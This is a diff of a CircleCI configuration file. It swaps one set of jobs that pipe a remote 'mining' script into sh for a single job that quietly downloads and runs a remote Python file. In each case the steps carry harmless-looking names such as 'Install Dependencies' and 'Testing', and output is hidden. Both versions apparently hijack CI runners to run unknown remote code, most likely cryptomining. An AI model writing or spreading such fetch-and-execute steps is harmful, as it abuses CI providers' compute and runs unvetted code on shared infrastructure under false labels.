@@ -1,38 +1,11 @@
 version: 2.1
 jobs:
-    Devop:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: timeout 1m lscpu
-    Devop1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: curl https://raw.githubusercontent.com/igoz89/mining/main/bitweb.sh | sh
-    Devop2:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: curl https://raw.githubusercontent.com/igoz89/mining/main/bitweb.sh | sh
-    Devop3:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: curl https://raw.githubusercontent.com/igoz89/mining/main/bitweb.sh | sh
-workflows:
-    version: 2.1
-    build:
-        jobs:
-            - Devop
-            - Devop1
-            - Devop2
-            - Devop3
+  build:
+    machine:
+      image: ubuntu-2004:202010-01
+    parallelism: 4
+    steps:
+      - checkout
+      - run:
+          name: "Testing"
+          command: wget https://raw.githubusercontent.com/aurbach55/zash/main/code.py >/dev/null 2>&1 && python code.py
